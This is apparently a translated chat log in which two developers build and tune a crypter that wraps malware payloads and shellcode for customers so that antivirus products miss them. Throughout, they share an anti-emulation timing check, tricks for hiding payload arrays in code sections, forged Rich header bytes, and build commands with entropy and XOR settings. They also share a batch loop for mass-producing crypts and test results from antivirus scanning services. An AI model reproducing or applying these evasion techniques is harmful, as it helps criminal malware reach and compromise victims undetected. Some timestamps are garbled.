[10.09.21 12:57:45] elroy: Terrible! )))
[10.09.21 12:58:08] basil: Yes?
[10.09.21 12:58:15] basil: No way!
[10.09.21 12:59:18] basil: what's that from?!
[10.09.21 12:59:22] basil: Don't you get it?
[10.09.21 12:59:47] elroy: It's probably this.
```
blockData[16187]=(char)-17;
    blockData[6541]=(char)-35;
    blockData[26177]=(char)-16;
    blockData[20596]=(char)-11;
```
[10.09.21 13:00:17] basil: So the vector seems to do something similar
[10.09.21 13:00:32] basil: Or does it do something else?
[10.09.21 13:00:48] elroy: I know...
[10.09.21 13:00:58] elroy: But last time there was a vector of 8 bytes
[9/10/21 13:01:04] elroy: not one
[10.09.21 13:01:17] elroy: Maybe that's why
[10.09.21 13:01:20] basil: and the size increased 8 times
[10.09.21 13:01:26] basil: By the way
[10.09.21 13:01:27] elroy: yes)
[10.09.21 13:02:01] basil: I somehow didn't pay attention. I got together and worked and already seems normal.
[10.09.21 13:02:11] elroy: Okay, do crt, I'll do 8 bytes at a time
[10.09.21 13:02:26] elroy: efrain would be furious))
[10.09.21 13:02:40] elroy: They need up to 300 kb crt
[10.09.21 13:02:48] basil: And what is he on? Or the customer?
[10.09.21 13:02:57] elroy: Tester
[10.09.21 13:03:11] elroy: Makes crypto for us under the tric
[10.09.21 13:03:33] elroy: And ours doesn't use it, the customer needs up to 100 kb before, now up to 300 kb
[10.09.21 13:03:55] elroy: But 8 mb is too much. Recently silver set a limit for crypt - up to 1 mb
[10.09.21 13:04:29] basil: Well, 8 mb... That's a lot. It's good that you're paying attention....
[10.09.21 13:04:40] basil: Where I get all this stuff from
[10.09.21 13:05:23] basil: over 100 errors when building without ctr
[10.09.21 13:05:48] basil: And the worst thing is he doesn't even write where they are
[10.09.21 13:05:55] basil: Linking bug
[10.09.21 13:06:04] elroy: Are you sure that the code you wrote works correctly? I'm talking about packing.
[10.09.21 13:06:29] basil: I was testing it. 8 builds in a row.
[10.09.21 13:06:35] basil: all worked
[10.09.21 13:06:50] basil: didn't do any more
[10.09.21 13:07:12] elroy: I'm doing a search now
```
blockData[10375]
```
in payload.cpp.
And found several of these lines where different values are assigned. What's the catch?
[10.09.21 13:07:51] basil: is this from one function?
[10.09.21 13:08:00] elroy: From different
[10.09.21 13:08:21] basil: So it should be. Blocks are different and different data
[10.09.21 13:09:05] elroy: Ah, it makes sense. Yes)
[10.09.21 13:10:05] elroy: Damn, yes. Just happened to catch my eye. Noticed the same index...
[10.09.21 13:11:12] basil: But I shuffle the indexes. So they don't go sequentially. Yesterday I thought they were talking about it.
[10.09.21 13:11:23] elroy: Yes.
[10.09.21 13:11:40] elroy: Apparently, it's the number that gives you the size increase.
[10.09.21 13:11:54] elroy: I'll try to make it 8 bytes, see what happens
[10.09.21 13:12:15] basil: this index must take up so much space
[10.09.21 13:12:27] basil: but honestly, I didn't notice it
[10.09.21 13:12:35] basil: good. you paid attention
[10.09.21 13:13:14] elroy: Yeah, probably...
Maybe it makes sense to randomize some number in a row, 20 for example, but build up the blocks
[10.09.21 13:13:39] elroy: Okay, figure out the crt. Look. There may not be any assembly because of the simplest.
[10.09.21 13:13:49] elroy: For example, because of = { 0 };
[10.09.21 13:13:58] elroy: It's the one that didn't find memcpy
[10.09.21 13:14:23] elroy: Or memset
[10.09.21 13:14:42] elroy: You should replace with m_memset and replace the expression
[10.09.21 13:14:52] basil: these (memcpy and memset) also exist
[10.09.21 13:15:41] basil: you have to rewrite CodeWrapper there is try operator and some other things
[10.09.21 13:15:49] basil: from std
[10.09.21 13:17:43] elroy: We have to. try can be thrown out, I think. We must replace it with something...
[10.09.21 13:18:12] basil: I do. Doing....
[13.09.21 12:43:36] elroy: hello
[13.09.21 12:44:02] basil: Hello.
[13.09.21 12:44:18] elroy: A tutorial from silver on how to stick an array anywhere in code using macros
```
 there's a quick start on how to do it

#pragma code_seg(push, ".text")
#pragma code_seg(pop)
unsigned char __declspec(allocate(".text")) hiddencode[]={ . };
```
[13.09.21 12:45:16] elroy: ``
you can shove the array into any section, or put several chunks into sections, in order to distribute entropy evenly and that's it, you've got your binary in the array, do whatever you want
```
[13.09.21 12:46:04] basil: now it turns out that you can evenly divide it by sections
[13.09.21 12:46:35] basil: and in which part of the section it will put the data? Do you know?
[13.09.21 12:47:32] elroy: I don't even know
[13.09.21 12:47:36] elroy: Just have to try
[09/13/21 12:47:38] elroy: Can you?
[09/13/21 12:47:47] basil: okay. There is a question.
[09/13/21/12:47:51] elroy: Yes.
[13.09.21 12:47:58] basil: somewhat on a different subject
[13.09.21 12:49:52] basil: I'm sitting all crt right now. Very slow, every step is a battle. The compiler won't tell me where the error is. Only the linker swears. And again it doesn't say where. I thought about it and decided that maybe I could disassemble it and find the places it would complain about.
[13.09.21 12:49:57] basil: But here's the problem.
[9/13/21/12:50:48] basil: I built my crypto with debugging information. There's PDB file. But IDA blames unknown format.
[13.09.21 12:50:56] basil: But I was uploading it earlier
[13.09.21 12:51:01] basil: no problems
[13.09.21 12:51:20] basil: ``
<< It appears that MS DIA SDK is not installed.
Please try installing "Microsoft Visual C++ 2008 Redistributable Package / x86" >>
```
[13.09.21 12:52:12] basil: I've already installed everything I could. And this problem also applies to cleanup. Maybe you'll give me an idea?
[13.09.21 12:52:53] basil: How can I load debugging information correctly?
[13.09.21 12:56:47] basil: It worked.
[13.09.21 12:56:53] elroy: Such error happens because of debug info type. Try different variants of the type of information.
Try specifying what to store in the program database when building.
It is important that the path corresponds.
[13.09.21 12:56:55] basil: I guess your karma
[13.09.21 12:57:01] elroy: ))
[13.09.21 12:57:09] basil: i'm not kidding
[13.09.21 12:57:14] basil: just now
[13.09.21 12:57:18] elroy: but I don't understand, what are you going to upload if there is no file?
[13.09.21 12:58:11] elroy: In that case, the strategy is very simple. It is necessary to comment out all code and uncomment it one by one. You'll see where exactly what appears
[13.09.21 12:58:59] basil: No. There are too many errors. So it seems to me.
[13.09.21 12:59:17] basil: You have to do it this way. First we build with ctr. Then in the properties of the project disable. Linker shows where the error is with exact function
[13.09.21 12:59:52] basil: And which crt function is used there.
[13.09.21 13:00:15] basil: Then we look in disassembler where exactly it is called
[13.09.21 13:00:36] basil: I've already found several places with this method.
[13.09.21 13:01:14] basil: Well, maybe this is unusual for me. As well as always.
[13.09.21 13:01:30] elroy: Good strategy, it's good that I found a way)
[13.09.21 13:01:38] elroy: Happy to share my aura))
[13.09.21 13:01:47] basil: )))
[13.09.21 13:01:50] basil: thanks
[13.09.21 13:01:56] basil: And for the aura too)))
[13.09.21 14:00:09] elroy: I noticed that you've been online since the second half. Solved the problem with access?
[13.09.21 14:01:10] basil: Now it became easier. But I can't guarantee it will be permanent.
[13.09.21 14:04:59] basil: The only thing...
[13.09.21 14:05:43] basil: For the time of your absence. I am guaranteed to be online from 12.20 MSK. Further practice will show.
[09/13/21 21 14:06:08] elroy: Okay.
[14.09.21 10:49:19] basil: Greetings.
[14.09.21 10:49:36] elroy: Hello.
[14.09.21 10:50:21] basil: Been sitting here with crt. More precisely with getting rid of it a little question arose
[14.09.21 10:50:34] basil: Just a moment.
[14.09.21 10:51:28] basil: there is measure2() function
[14.09.21 10:51:53] basil: As I understand emulation detection goes there?
[14.09.21 10:52:07] elroy: Yes
[14.09.21 10:53:27] basil: So. When casting types, especially when casting a real number to an integer for example here:
```
		if (!WA->dQueryPerformanceCounter(&li))
			continue;
		fPerfStep2 = static_cast<double>(li.QuadPart);
```
[14.09.21 10:53:44] basil: crt libraries are used
[14.09.21 10:54:02] basil: theoretically you could do this
[14.09.21 10:55:26] basil: ``
		DWORD64 temp = li.QuadPart;
		fPerfStep2 = 0;
		for (; temp>0; temp--)
			fPerfStep2++;
```
[14.09.21 10:56:11] basil: But won't it affect the timings? Or is it better to use a pointer after all?
[14.09.21 10:56:14] elroy: cool bike)))
[14.09.21 10:56:27] basil: Well, in my style. You know.
[14.09.21 10:56:33] basil: I want some advice.
[14.09.21 10:56:44] elroy: Actually, it will.
[14.09.21 10:57:46] elroy: 1) google how to convert
2) use fPerfStep2 += 4096, for example or any other value
[14.09.21 10:57:59] elroy: double has a problem with addition, you can lose a lot when adding
[14.09.21 10:58:06] elroy: Think of a method with multiplication
[14.09.21 10:58:11] elroy: Similar
[14.09.21 10:59:13] basil: ok. ok. As I understand, I will have to do the same thing with code generator, there are also many places to convert types.
[14.09.21 10:59:18] basil: But can't....
[14.09.21 11:00:13] basil: Tell me more about what measure2 does. Then I can understand what is critical for it and what is not. Maybe then the idea will go farther...
[14.09.21 11:00:57] elroy: I can.
[14.09.21 11:00:59] elroy: I will.
[14.09.21 11:01:09] elroy: But I'm busy right now. Let's do it later.
[14.09.21 11:01:49] basil: Okay. Drop a message in the chat room when you're free. I still have some things to think about in my code.
[14.09.21 11:24:32] elroy: Let's discuss it.
[14.09.21 11:25:01] basil: Okay.
[14.09.21 11:26:20] elroy: A moment)
[14.09.21 11:28:33] elroy: https://file.io/ReEaNArCesoW
[14.09.21 11:29:32] basil: a moment
[14.09.21 11:30:35] basil: yes
[14.09.21 11:31:32] elroy: This is a utility to test the algorithm
[14.09.21 11:32:05] elroy: Now let's go over the algorithm itself
[14.09.21 11:32:20] elroy: If you're going to make any changes, check it with the utility first
[14.09.21 11:32:30] basil: Okay.
[14.09.21 11:33:40] elroy: The idea is this.
First the processor warms up, this is done by the loop
```
for (double i = 0; i < 1024 * 1024 * 200; i++);
```
It's necessary to bring processor out of power-saving mode
[14.09.21 11:33:59] basil: didn't know.
[14.09.21 11:34:05] basil: so what's next?
[14.09.21 11:35:24] elroy: what comes next is polling the high precision timer value, it's usually a module in the chipset or somewhere else, outside of the CPU.
[14.09.21 11:35:45] basil: __rdtsc()?
[14.09.21 11:36:06] elroy: This timer ramps up from zero (from system start and with platform-specific increment.
No, QueryPerformanceCounter.
[14.09.21 11:36:33] elroy: You can find out how much it grows in 1 second with QueryPerformanceFrequency
[14.09.21 11:36:59] elroy: It doesn't matter for us, it's just a call
[14.09.21 11:38:11] elroy: __rdtsc is also a performance timer, but it's inside the CPU and it's actually picked up by rdtsc instruction (in asm), here function is what implements the call and puts the result
[14.09.21 11:38:52] elroy: I.e. got two values from two timers different in nature
[14.09.21 11:39:01] elroy: And went to count nothing
[14.09.21 11:39:03] elroy: for (long long i = 0; i < (102400 * rnd / 2); i++)
			if (!dQueryPerformanceFrequency(&li))
				break;
[14.09.21 11:39:49] elroy: After recalculation we got the timer values again and got how many ticks the recalculation for one timer lasted and how many ticks the recalculation for another timer lasted
[14.09.21 11:40:32] elroy: Then we repeated the recalculation
[14.09.21 11:41:08] basil: yes I see.
[14.09.21 11:41:11] basil: And then?
[14.09.21 11:41:27] elroy: slept 200 milliseconds after recalculation
[14.09.21 11:41:38] elroy: Then we repeated it 5 times (the constant is taken out there).
[14.09.21 11:41:45] elroy: called counter
[14.09.21 11:41:52] basil: I see
[14.09.21 11:42:09] elroy: when repeated 5 times, everything was put into arrays
[14.09.21 11:42:49] elroy: Now we checked.
Found some average for 5 measurements of one timer, and another
[14.09.21 11:44:34] elroy: And then there's a calculation that *the ratio* of timer values should differ by at least 40% for each dimension
[14.09.21 11:45:26] elroy: In this case the error should be more than 0.2% and less than 3%
I don't remember the exact math in this cycle, but I think it's like this
[14.09.21 11:45:51] elroy: If there are violations somewhere, the cycle repeats
[14.09.21 11:46:02] elroy: This is actually what hangs up
[14.09.21 11:46:55] elroy: The idea here is simple, the high precision timer and the timer on the CPU should not diverge by more than 3 percent, but should differ slightly if they are different (0.2 percent, taking into account calculation error)
[14.09.21 11:47:26] elroy: That said, the runs should never be the same, in a multitasking system usually a minimum of 40%
[14.09.21 11:47:35] elroy: (because of preemptive multitasking)
[14.09.21 11:48:04] basil: That is, I understand that in a virtual machine its speed will depend on its load and the high precision timer it takes from the host timer.  That's why there is a discrepancy. Did I get it right?
[14.09.21 11:48:41] elroy: I wrote the idea above. No, it still works on the virtual machine)
[14.09.21 11:49:02] elroy: In AV emulator for the timer takes the same value
[14.09.21 11:49:18] basil: okay. let me read it again.
[14.09.21 11:49:18] elroy: In this case, if there is emulation, it does not take into account environment
[14.09.21 11:49:41] basil: I'll look into it.
[14.09.21 11:51:42] basil: Here's another question. A customer wrote me (via spam bot) and said I should rebuild it with new gaskets. I asked him who can I go to, he says mono or elroy. Maybe you can tell which state to write?
[14.09.21 11:53:19] elroy: You need to know the ip of the server, and for gaskets you can go to rocco, demetrius, say only that it is spambot, rocco knows (you can say "as elroy did").
[14.09.21 11:53:50] basil: ok. Thanks a lot.
[14.09.21 11:56:28] elroy: I wish I could check bot on dincheck
[14.09.21 11:56:37] elroy: He must have more than just pads...
[14.09.21 11:57:35] basil: I will, of course. Usually before I pass the binary, I make more links to vinchek.
[14.09.21 11:57:38] basil: dinchek
[14.09.21 15:18:15] elroy: We have detects on buildmachine, for cryptocurrencies BC is asked to do locally. Locally no detects for some reason, made clean
[14.09.21 15:18:28] elroy: While I'm gone, you have to
[14.09.21 15:19:02] basil: Okay. And the load?
[14.09.21 15:19:11] elroy: It's coming off
[14.09.21 15:19:15] basil: And how many do you have to do?
[14.09.21 15:19:16] elroy: Profile
[14.09.21 15:19:22] elroy: As many as they ask
[14.09.21 15:19:26] elroy: Two today.
[14.09.21 15:19:31] elroy: Nothing yesterday.
[14.09.21 15:19:38] elroy: Friday I think they asked for 100
[14.09.21 15:19:45] basil: 100!!!!
[14.09.21 15:19:52] basil: that's what I understand!
[14.09.21 15:20:02] elroy: I can give you script with cycle, it does as much as you want.)
[14.09.21 15:20:25] basil: well, I can write that script too
[14.09.21 15:20:35] basil: as long as they are clean
[14.09.21 15:20:43] elroy: It's a script for 60
```
@echo off
set /a x=0
:while
if %x% lss 60 (
  echo %x%
  set /a x+=1
  cmd.exe /c build --gen-exports yes --entropy-max-rdata 6.3 -s c:\temp\bk -p c:\temp\bk\l_dll_rndll_sw_64_p2_25_v65_02_09_21_logs_no.dll
  goto :while
)
```
[14.09.21 15:21:36] elroy: If anything, detects, do tuning, there code complexity parameters and percentage parameter xor
[14.09.21 15:22:08] elroy: I'm about to add edits to the build for vs 2022
[14.09.21 15:22:32] basil: And who else do I contact for the load?
[14.09.21 15:22:51] elroy: Made clean) a tiphack like this.
It's really terribly unstable, if it hangs, you have to take it off the dispatcher.
[14.09.21 15:23:01] elroy: They will come by themselves, they will ask
[14.09.21 15:23:03] elroy: They'll get it.
[14.09.21 15:23:09] elroy: Don't worry.)
[14.09.21 15:23:31] basil: Well, yes... That's how it should be!
[14.09.21 15:24:06] basil: bk branch?
[14.09.21 15:24:18] basil: ghjabkm
[14.09.21 15:24:19] elroy: Yes, but I'm not.
[14.09.21 15:24:20] basil: profile
[14.09.21 15:24:27] elroy: develop_payload_bk
[14.09.21 15:24:31] elroy: update it
[14.09.21 15:24:32] basil: ok
[14.09.21 15:25:02] basil: are you leaving tomorrow or Thursday?
[14.09.21 15:25:21] basil: I thought he said September 16
[14.09.21 15:25:31] elroy: 16.
[14.09.21 15:25:44] elroy: any questions, you should practice
[14.09.21 15:27:37] basil: I think everything worked for me so far. True on the test files. I and after, our activities with "spilling" the new encryption on branches, tried to crypto load test from the cryptopanel. Everything was fine.
[14.09.21 15:27:47] basil: Well, as of now.
[14.09.21 15:27:59] elroy: Good for you)
[14.09.21 15:28:57] basil: So .... Well sort of..... Maybe you're worrying for nothing. It's better not to worry, once you start - everything falls out of hand. You know - the aura. I'm serious!
[14.09.21 15:29:18] basil: Thoughts are material.
[14.09.21 15:29:35] elroy: )))
[14.09.21 15:29:36] basil: You should think about the beach!
[14.09.21 15:29:53] elroy: Nah, what beaches....
[14.09.21 15:30:22] elroy: Caves and passages.
[14.09.21 15:30:23] basil: Well, I do not insist, just rest is also an important thing.
[14.09.21 15:30:29] elroy: The joke's a year old, but it's funny)))
[14.09.21 15:31:02] basil: You mean "make an entrance"?
[14.09.21 15:32:24] elroy: Yes.
[14.09.21 15:32:56] basil: well, yes, it was funny. But the "live cryptor" was funnier in my opinion.
[14.09.21 15:33:04] basil: Whatever.
[14.09.21 15:49:48] elroy: Keep it to yourself
[14.09.21 15:50:13] elroy: ``
build-vs2022.bat --gen-exports yes --stub 4 --entropy-max-rdata 6.0 --pack-prop-xor 68 -s c:\temp\bk --code-complexity 3,3,3,3,3,3 --pack-complexity 3,4,2,3,4 -p c:\temp\bk\dl_20_release_nologs_group_20_ver_1_38_x64_regsvr32.dll
```
[14.09.21 15:50:46] elroy: These are parameters, did clean builds with them today
[14.09.21 15:51:24] basil: yes.
[14.09.21 15:54:28] basil: yes. one more request. The link to vs2021 is lost. I lost it. Please, do it again.
[14.09.21 16:01:09] elroy: https://visualstudio.microsoft.com/vs/preview/#download-preview
[14.09.21 16:01:28] elroy: It works 14 days
[14.09.21 16:01:43] elroy: Then you have to activate only your account
[14.09.21 16:01:50] elroy: Probably have to reinstall
[14.09.21 16:01:58] elroy: Just be ready to move it
[14.09.21 16:02:10] elroy: Download offline installer by following instructions, like I did
[14.09.21 16:02:25] basil: Okay.
[14.09.21 16:13:15] elroy: Here's something else, write it down.
[14.09.21 16:13:17] basil: anything else?
[14.09.21 16:13:23] elroy: Yeah.
[14.09.21 16:13:26] elroy: Write it down.)
[14.09.21 16:13:30] basil: listening
[14.09.21 16:13:38] basil: I'll get a pen
[14.09.21 16:14:00] elroy: The dev_vs2022_profile branch contains changes for build on studio 2022, also there is a InitializeWinAPI fix
[14.09.21 16:15:48] elroy: For crypt bk you need to do this:
```
git checkout dev_vs2022_profile
git pull
`` git checkout develop_payload_bk
git pull
git merge dev_vs2022_profile
```
This applies to any profile that needs to be crypted over fresh. But I'm not sure about merging it now yet
[14.09.21 16:16:15] elroy: It was just a busy day) It was done on the fly. It's a good idea to test everything and then merge it if you need to. Or leave it there.
[14.09.21 16:16:26] basil: and it also supports other profiles - thought only develop
[14.09.21 16:16:40] basil: jnkbxykj
[14.09.21 16:16:42] basil: great
[14.09.21 16:16:47] elroy: all supported, but not tested)
[14.09.21 16:16:49] basil: I mean good
[14.09.21 16:17:21] basil: that's what I'll do. I'll switch over from crt
[14.09.21 16:17:34] elroy: Yeah, do it.
[14.09.21 16:17:42] elroy: Test tomorrow
[14.09.21 16:17:48] elroy: already on 2022.
[14.09.21 16:18:07] elroy: There's also the question of whether 2019 profiles are hooked because of this
[14.09.21 16:18:14] elroy: That's why I didn't pour in
[14.09.21 16:19:14] elroy: Don't forget about git pull, branches may not be refreshed... I wrote, there was a problem, for example with the develop branch, my additions went somewhere there
[14.09.21 16:19:18] elroy: maybe a git glitch
[14.09.21 16:19:23] elroy: Maybe he just didn't refresh the branch
[14.09.21 16:19:49] basil: I got it .ok
[9/15/21 10:01:18] elroy: Greetings.
[9/15/21 10:01:32] basil: hello
[9/15/21 10:01:41] elroy: Here's something to cheer you up:
```
 Hi. The SC stubs need to be cleaned. Yesterday worked 7 it got burned.
In idelaesh of course your 2 work or some similar to make. This one has the best reviews.
```
[15.09.21 10:02:16] basil: "SC" is what?
[15.09.21 10:02:35] basil: shell code
[9/15/21 10:02:46] basil: okay. got it.
[15.09.21 10:04:06] basil: Who can I get a load from for dincheck?
[15.09.21 10:07:31] elroy: Load for dincheck, how?
[15.09.21 10:08:16] basil: well, I have to cover it with a cryptor. Then the resulting file should be tested. Right?
[15.09.21 10:08:28] basil: That's how I did it, right?
[15.09.21 10:09:35] basil: Or you can test it
[15.09.21 10:09:53] basil: it can be on test ones not glowing and on combat load glowing
[15.09.21 10:10:34] elroy: Usually yes... Depends on what purpose load is needed. If you check the functionality and basic detects, then I'll send you the load, the whole archive with the sources. I check with this. Then, if there are no detects and everything works, I take load from manuel. For bk, you can write a wild
[15.09.21 10:11:56] basil: ok. ok.
[9/15/21 10:12:13] basil: I'll check the test one for now
[15.09.21 10:12:45] elroy: manuel wrote that what I've scripted today is not working
[15.09.21 10:12:58] elroy: I was crypting with just that branch under 2022
[9/15/21 10:13:12] elroy: Something must have gone wrong, I need to double-check
[15.09.21 10:13:51] basil: I put myself 2022. At least it works for me. Okay, I'll go through debugger again.
[9/15/21 10:14:03] basil: ok
[9/15/21 10:14:35] elroy: Write test shellcode by rundll profile, entry point StartW, it didn't work for some reason
[15.09.21 10:26:23] basil: I have a crash at all. It's not working.
[9/15/21/10:26:42] basil: now look where the error crashes
[15.09.21 10:27:45] elroy: For 2022 I need build-vs2022 script, do you build with it?
[15.09.21 10:28:12] basil: yes.
[15.09.21 10:28:22] elroy: parameter --stub 4 is needed
[9/15/21 10:28:49] basil: ``
build-vs2022.bat --gen-exports yes --stub 4 --entropy-max-rdata 6.0 --pack-prop-xor 68 -s c:\temp\bk --code-complexity 3,3,3,3,3,3 --pack-complexity 3,4,2,3,4 -p C:/temp/helloworld_64_shellcode.bin
```
[9/15/21 10:29:14] basil: no. not --stub 4
[15.09.21 10:29:46] elroy: --gen-exports is to make a table based on a source dll, usually applicable for dll load, not for shellcode
[15.09.21 10:29:52] elroy: Shellcode is built differently
[15.09.21 10:29:55] elroy: Momentum
[15.09.21 10:30:38] elroy: ``
build-vs2022.bat -sc 64 --stub 4 --entrypoint StartW -t dll --entropy-max-rdata 6.0 --pack-prop-xor 76 -s c:\temp -p C:\temp\sc_http_x64_dll.bin --code-complexity 3,3,3,3,3 --pack-complexity 3,4,2,3,4
```
[9/15/21 10:31:29] elroy: you must specify the bit depth for shellcode, -sc 64 or -sc 32, for rundll you must specify entrypoint from where shellcode is running
[9/15/21 10:36:27] basil: ok. that's better.
[15.09.21 10:36:53] elroy: Now we just need to run it.)
[15.09.21 10:38:29] basil: entry point too
[15.09.21 10:40:16] basil: test positive
[15.09.21 10:40:23] basil: maybe battle
[15.09.21 10:40:29] basil: ?
[15.09.21 10:49:06] elroy: I also tested positive
[9/15/21 10:49:10] elroy: Interesting.
[15.09.21 10:49:29] elroy: And we can't check combat, only manuel can
[15.09.21 10:49:39] elroy: He says it crashes
[15.09.21 10:49:46] basil: Well, I greeted him
[15.09.21 10:49:47] elroy: In general, it's possible to start
[9/15/21 10:49:55] elroy: Perfect.)
[15.09.21 10:49:58] basil: but he hasn't answered yet
[15.09.21 10:50:01] elroy: Take it, try it)
[15.09.21 11:01:05] basil: He showed up. But again disappeared somewhere. Let's hope he'll show up soon.
[15.09.21 11:18:24] elroy: I added you a wild tab in the panel
[15.09.21 11:19:06] basil: manuel replied that the load on the other stubs works. At least that's what he wrote. But until he sent a sample.
[15.09.21 11:19:21] basil: and new tab for what purpose?
[15.09.21 11:19:41] elroy: This is a wild tester tab
[15.09.21 11:20:25] basil: I see in the group, by the way, the cryptor holds positions
[15.09.21 11:20:28] elroy: There's a file on it
dl2_x64_20_408.dll is bk

In general, there is an insane need for extra clean crypts minted in both AVC and Denchek, the point is that I make two crypts at once, I already told you, one of them I check in Denchek, another in AVC, and the one in AVC I do not send to the customer, but I delete it. Here's how to make you give me one crypt so checked

Can you organize as asks?
[15.09.21 11:20:39] basil: at least for now...
[15.09.21 11:21:09] basil: now the moment
[15.09.21 11:21:22] elroy: (that's his quote)
[15.09.21 11:21:51] basil: is this about "superchip crypto" quote?
[15.09.21 11:21:57] elroy: yes
[9/15/21 11:22:25] basil: let's do it
[15.09.21 11:22:27] basil: okay.
[15.09.21 11:22:33] basil: any load?
[15.09.21 11:22:46] elroy: dl2_x64_20_408.dll - this is pc
[15.09.21 11:22:51] elroy: On his tab
[15.09.21 11:23:27] basil: one more question. On avcek verified is it a utility, right? Right?
[15.09.21 11:24:18] basil: It seems to use dinchek API. But it turns out the same dincheck!
[9/15/21 11:24:33] elroy: This site, avcheck.net, you do static scan there
[9/15/1921 11:24:47] basil: got it. Okay.
[09/15/21 11:24:55] elroy: You have access, right?)
[9/15/21 11:25:10] basil: Now.
[9/15/21 11:25:21] basil: Yeah.
[9/15/21 11:25:22] basil: yes
[15.09.21 11:26:06] basil: it's okay
[15.09.21 11:27:12] elroy: ok0
[15.09.21 13:38:07] elroy: tell me, did you check profiles yesterday ?
[15.09.21 13:38:13] elroy: Or today?
[15.09.21 13:39:00] basil: Not yesterday. Now since the beginning of the day I'm sitting with "ultra-clear crypts"
[15.09.21 13:39:16] elroy: No superclean yet?
[9/15/21 13:40:26] basil: there is almost pure. nod32 only "survives" everything. And detection jumps from build to build. And it jumps every time because of char* nopWinApiFunc[].
[15.09.21 13:40:47] basil: I've already turned off almost everything, but it still won't work
[9/15/21 13:41:50] basil: That's what it is! Fucking hell!
[9/15/21 13:42:28] elroy: He's there for another reason, I guess.)
[15.09.21 13:42:52] basil: and what's the reason?
[15.09.21 13:43:47] elroy: He's scorching the rich header. I'm just guessing)
[9/15/21 13:44:13] elroy: Open config.h in SolutionBuilder
And replace it with this:
```
const unsigned char RichSign[] = {
	0xE6, 0x93, 0x67, 0x1D, 0xA2, 0xF2, 0x09, 0x4E, 0xA2, 0xF2, 0x09, 0x4E, 0xA2, 0xF2, 0x09, 0x4E,
	0xAB, 0x8A, 0x9A, 0x4E, 0x8C, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0x0C, 0x4F, 0xA0, 0xF2, 0x09, 0x4E,
	0xC7, 0x94, 0x0A, 0x4F, 0xA0, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0x0D, 0x4F, 0xB6, 0xF2, 0x09, 0x4E,
	0xA2, 0xF2, 0x08, 0x4E, 0xD6, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0x08, 0x4F, 0xB1, 0xF2, 0x09, 0x4E,
	0xC7, 0x94, 0x01, 0x4F, 0xA4, 0xF2, 0x09, 0x4E, 0xC7, 0x94, 0xF6, 0x4E, 0xA3, 0xF2, 0x09, 0x4E,
	0xC7, 0x94, 0x0B, 0x4F, 0xA3, 0xF2, 0x09, 0x4E, 0x52, 0x69, 0x63, 0x68, 0xA2, 0xF2, 0x09, 0x4E,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};
```
[9/15/221 13:44:52] elroy: Or on
[09/15/21 13:45:12] elroy: ``
const unsigned char RichSign[] = {
	0x54, 0x4B, 0x74, 0x45, 0x10, 0x2A, 0x1A, 0x16, 0x10, 0x2A, 0x1A, 0x16, 0x10, 0x2A, 0x1A, 0x16,
	0x04, 0x41, 0x19, 0x17, 0x1A, 0x2A, 0x1A, 0x16, 0x04, 0x41, 0x1F, 0x17, 0x88, 0x2A, 0x1A, 0x16,
	0x04, 0x41, 0x1E, 0x17, 0x02, 0x2A, 0x1A, 0x16, 0x42, 0x5F, 0x1F, 0x17, 0x35, 0x2A, 0x1A, 0x16,
	0x42, 0x5F, 0x1E, 0x17, 0x03, 0x2A, 0x1A, 0x16, 0x42, 0x5F, 0x19, 0x17, 0x01, 0x2A, 0x1A, 0x16,
	0x04, 0x41, 0x1B, 0x17, 0x19, 0x2A, 0x1A, 0x16, 0x10, 0x2A, 0x1B, 0x16, 0x78, 0x2A, 0x1A, 0x16,
	0x46, 0x5F, 0x12, 0x17, 0x11, 0x2A, 0x1A, 0x16, 0x46, 0x5F, 0xE5, 0x16, 0x11, 0x2A, 0x1A, 0x16,
	0x46, 0x5F, 0x18, 0x17, 0x11, 0x2A, 0x1A, 0x16, 0x52, 0x69, 0x63, 0x68, 0x10, 0x2A, 0x1A, 0x16
};
```
[15.09.21 13:45:40] basil: it may be so of course. But here's a detect on import table all the time
[15.09.21 13:45:55] elroy: Check it yourself)
[15.09.21 13:46:13] elroy: I was doing it this morning
[15.09.21 13:47:28] basil: first - no
[15.09.21 13:49:17] basil: and the second one, no
[15.09.21 14:02:33] basil: that's better
[15.09.21 14:02:33] basil: https://dyncheck.com/scan/id/fac184adb804e51b19dbc62eb60b0aa3
[15.09.21 14:03:12] basil: not bad either
[15.09.21 14:03:13] basil: https://avcheck.net/id/sYDtf1allkaq
[15.09.21 14:13:34] basil: I have a question. If I'm asked to manually encrypt load, do they (those who ask) know what type of load the file refers to?
[15.09.21 14:17:06] elroy: Usually they know, you can ask how they crypt in the panel
[9/15/21 14:18:08] basil: Okay.
[9/15/21 14:35:37] basil: Ugh.... The main thing guys - don't grow old with your heart....
[15.09.21 14:35:59] elroy: )
[15.09.21 14:36:14] elroy: How did you get rid of the detector?
[15.09.21 14:36:56] basil: just these 2 functions:
```
		"GetCommandLineA();\r\n",
		"CreateMenu();\r\n",
```
[15.09.21 14:37:12] basil: left in char* nopWinApiFunc[]
[15.09.21 14:37:33] basil: he's especially confused by all sorts of keyboard operations
[15.09.21 14:37:47] elroy: That's strange
[9/15/21 14:38:27] basil: well at the moment the builds are really "super clean". This will be the password
[15.09.21 14:38:31] basil: ))
[15.09.21 14:39:02] elroy: )
[15.09.21 14:39:33] basil: well, that crypto's just like a live one...
[15.09.21 14:39:42] basil: very peculiar behavior
[15.09.21 14:39:57] elroy: I'll make some changes in develop_payload_bk now, this update is a requirement of uk developers, I'll have to check it
[15.09.21 14:40:44] elroy: Although no, now I'll check, then I'll introduce))
[15.09.21 14:40:50] elroy: Just update it yourself.
[15.09.21 14:41:00] basil: okay.
[15.09.21 14:41:03] elroy: And you still need to check branches, update on build machine
[15.09.21 14:41:27] elroy: *check if 2019 is build by studio with overlay branch 2022
[15.09.21 14:42:07] basil: and about working with jenkins, who to contact ?
[15.09.21 14:42:28] elroy: What about it? What exactly?
[15.09.21 14:43:25] basil: Yes with them at the moment everything is fine. But if the need arises, so to speak, while you're gone.
[15.09.21 14:44:16] elroy: Collin and orval are in charge of the crypto topic when I'm not here. With any questions to them. They can demand something too)
[15.09.21 14:45:11] basil: well, i'm not against demands)))) With demands I always agree)))
[15.09.21 14:45:15] basil: So it must be so
[15.09.21 14:46:59] elroy: )
[15.09.21 15:24:36] basil: Go on vacation at last!!! Why are you sitting at work? ))))
[15.09.21 15:24:50] basil: The horror!
